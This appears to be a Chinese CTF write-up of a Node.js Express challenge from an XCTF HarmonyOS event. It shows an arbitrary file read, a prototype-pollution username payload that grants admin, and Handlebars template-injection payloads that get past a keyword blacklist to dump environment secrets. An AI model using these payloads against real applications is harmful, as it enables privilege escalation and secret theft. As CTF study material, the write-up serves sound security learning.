---
title: 华为HCIE的第一课 Writeup
date: December 28th 2020
tags: [CTF, Writeup, HarmonyOS, Web安全]
summary: XCTF HarmonyOS 与 HMS 专场赛题 Writeup，记录华为 HCIE 第一课题目的完整分析思路与解题过程。
---

# 华为HCIE的第一课 Writeup

## 说在前面

周末是XCTF的HarmonyOS和HMS专场比赛，起床后就开始看，因为这一道题花了比较长的时间才做出来，所以觉得还是有记录一下的必要。

题目考点：

- Nodejs简单审计
- 原型链污染漏洞
- hbs模板注入导致信息泄露

## 解题过程

### 题目简览

题目打开后需要输入用户名登录：

![](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/28/16090744984810.jpg)

登录之后是一个计算ip地址的一些信息的工具：

![](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/28/16090746318175.jpg)

点击去开发会跳转到`/admin`去，显示`forbidden`

![](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/28/16090747646935.jpg)

### 简单审计

在打开题目后链接就会跳转到`http://124.71.204.195:31799/?f=login.html`，简单尝试一下就可以发现这里是一个任意文件读取：

![-w859](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/28/16090750515361.jpg)

可以把所有题目源码与相关依赖文件都下载下来，本地可以直接调试。需要注意的是这里没法下载`.env`文件，这个文件是用于`dotenv`模块加载环境变量配置的。

简单审计一下可以了解到这些文件的基本用途：

- app.js 配置并启动express(其中包括设置session、静态文件、模板解析引擎、路由等等)
- login.js 用于设置req.session.name为传入的username
- calc.js 用于计算ip相关信息的代码(用于混淆用的，实际解题毫无用处)
- admin.js 会经过一个ip等信息的判断，可以设置计算ip页下发的内容，后面详细分析
- util.js 一些处理函数

主要来看`admin.js`：

```js
module.exports = (app, env) => {

    const {htmlencode, replaceAll, md5} = require("./util")
    const fs = require("fs")
    const path = require("path")

    app.get('/admin', (req, res) => {
        let user
        try {
            user = JSON.parse(`{"name" : "${req.session.name}", "time" : "${Math.ceil(new Date().getTime() / 1000)}", "ip" : "${req.ip}"}`)
        } catch (e) {
            res.end("error")
            return
        }
        let userinfo = {}
        Object.keys(user).forEach((key) => {
            if (key.trim() === "isAdmin")
                userinfo[key] = 0
            else userinfo[key] = user[key]
        })
        
        if (req.session.ip === '127.0.0.1')
            userinfo.isAdmin = 1;

        req.session.name = userinfo.name
        req.session.time = userinfo.time
        req.session.ip = userinfo.ip
        req.session.isAdmin = userinfo.isAdmin

        if (req.session.isAdmin !== 1) {
            res.end("forbidden")
            return;
        }

        res.render("admin", {"name":req.session.name})
    })

    app.post("/admin", async (req, res)=>{
        if (!req.session.isAdmin || !req.body.code) {
            res.status(403).end("forbidden")
            return
        }

        let html = "name : {{name}}, time : {{time}}, ip : {{ip}} \ntips: {{env.banner}}<br><a href='/admin'>返回</a><br><br>\n\n" + fs.readFileSync(path.resolve(__dirname, "../views/calc.html"))
        let list = ['secret', 'env', 'flag', 'if', 'unless', 'for', 'lookup', '[', ']', '@' ]
        let code = req.body.code + ""
        let padd = `<p class="t-big-margin no-margin-b flex-center">这里开发中...&nbsp; <a href="/admin" target="_blank">去开发</a></p>`

        await list.forEach((black) => {
            code = replaceAll(black, htmlencode(black), code)
        })

        html = html.replace(padd, code)
        let filename = md5(html) + ".html"
        let filepath = path.resolve(__dirname, "../views/users/"+filename)
        if (fs.existsSync(filepath))
            fs.unlinkSync(filepath)
        fs.writeFile(filepath, html, err => {
            if (err) {
                res.end("error")
            } else {
                res.render("users/"+filename, {
                    "name" : req.session.name,
                    "time" : Math.ceil(new Date().getTime() / 1000),
                    "ip" : req.ip,
                    "env" : env.parsed
                })
            }
        })

    })

}
```

把GET请求的过程理一下：

1. 通过JSON.parse()解析了一个json数据，一共有三个键：name、time、ip，而这个name是可控的，并且拼接到json中可以添加键值
2. 通过一次循环，将user的值传递给userinfo，但是当键名为isAdmin时，会把这个值置0
3. 判断req.session.ip是否为127.0.0.1，如果是的话就把userinfo.isAdmin设置为1
4. 把userinfo的值传给session
5. 判断userinfo.isAdmin是否为1，如果不为1，则返回forbidden

这里我们的主要目的就是怎么让`isAdmin`为`1`，大概有这么几个思路：

1. 在上方第二步那里通过在键名里加一些特殊字符的trick让isAdmin无法被置为0 (fuzz了一下00-ff，失败)
2. 伪造ip地址
  1. 队友说可以通过伪造req.ip，设置app.set('trust proxy', true);就可以通过X-Forwarded-For伪造。参考 (trust proxy默认为false 失败)
  2. 我想的是通过控制JSON.parse()的参数值，让后面的ip不解析，而解析一个我们所控制的ip值来绕过ip检测 (没找到可以成功解析的方式 失败)
3. SESSION伪造 (之前说过无法读取.env，session的secret在这个文件里，不知道secret也不能任意上传文件的情况下无法伪造 失败)
4. 是否有原型链污染可以利用？

### 原型链污染

前三种思路都失败了，后面发现是在JSON.parse这里存在一个原型链污染问题。

![-w800](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/28/16090779523552.jpg)

通过构造username为：`Threezh1","__proto__":{"isAdmin":1},"test":"`就可以污染到`isAdmin`。通过`req.session.isAdmin = userinfo.isAdmin`这句命令传递后，我们再访问`/admin`页面就不会是`forbidden`了。

![](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/28/16090866177957.jpg)

这里提交的是一个`code`参数，POST发包给`/admin`页面。

### hbs模板注入导致信息泄露

接着来看一下POST请求是怎么处理的：

- 判断req.session.isAdmin和code参数
- 对code参数值进行了过滤，list列表里的内容都会过滤转义
- 最后拼接了一个html页面源码写到本地文件再回显到页面上

这里是一个比较明显的模板注入，搜了一下关于hbs的相关模板注入，找到了一篇关于Handlebars库导致RCE的文章：[漏洞挖掘：Handlebars库 模板注入导致RCE 0day](https://xz.aliyun.com/t/4695)

但很快啊，就发现RCE行不通，题目环境中的是最新版，文章中的payload已经不管用了。只能想其他的办法。

注意到传入模板变量时候的一个问题：这里传入的`env`是把包含所有环境变量的变量传入进去了。又因为页面中的一部分是我们能传入`code`参数控制的。所以我们是可以通过一些模板定义好的语句读出所有的`env`所包含的环境变量的。

```plain
res.render("users/"+filename, {
    "name" : req.session.name,
    "time" : Math.ceil(new Date().getTime() / 1000),
    "ip" : req.ip,
    "env" : env.parsed
})
```

首先是寻找到了这么一篇帖子：[2020 Defenit CTF Writeup](https://caya8.hatenablog.com/entry/2020/06/07/181927) 里面的payload形式是这样的：

```html
{{#each this}}{{@key}} => {{this.toString}}<br>{{/each}}
```

由于这里的`@key`由于`@`被过滤了，以及这样简单的遍历没法得到环境变量中的内容，最后构造一了一个可以拿到所有环境变量的语句[参考](https://handlebarsjs.com/zh/guide/builtin-helpers.html#each)：

```plain
{{#each this}}{{#with this}}{{#each this}}<h3>{{this.toString}}</h1><br>{{/each}}{{/with}}{{/each}}
```

submit之后就可以在页面上看到flag了：

![](https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/28/16090879519058.jpg)

当时我写的时候比较匆忙，这个payload可以变得更短，payload@p1g3：

```plain
{{#each this}}{{#each this}}{{this.toString}}{{/each}}{{/each}}
```

## 总结

感觉题目不算特别难，但就是有很多地方意想不到。对各种细节还需要再注意一些…